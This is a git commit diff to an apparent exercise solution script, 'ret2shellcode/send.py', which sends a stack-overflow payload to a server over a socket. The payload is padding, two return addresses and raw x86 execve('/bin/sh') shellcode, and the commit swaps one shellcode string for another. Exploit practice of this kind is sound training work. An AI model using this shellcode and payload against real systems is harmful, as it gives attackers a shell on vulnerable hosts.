489407bef80a1ba8435e5ba8a73acf4032ea4285
Erkai Yu <si1krow@outlook.com>
2023-03-09 23:16:56 -0600

    .

--- PWN_I/ret2shellcode/solution/send.py
+++ PWN_I/ret2shellcode/solution/send.py
@@ -24,8 +24,9 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     ret_addr1 = pack("<I", ret_addr1)
 
 	# Shellcode & return address
-    shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80\x00"
+    # shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80\x00"
     
+    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00"
 
     # Run your Python code and save the output to a variable
     payload = b"A"*40 + ret_addr2 + ret_addr1 + shellcode
@@ -40,8 +41,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     # Receive feedback from the server
     data = s.recv(1024)
     print(data)
-    feedback = data.decode()
-    print("Feedback from server: ", feedback)
+    # data = data.decode()
+    print("Feedback from server: ", data)
 
     # Receive feedback from the server
     data = s.recv(1024)
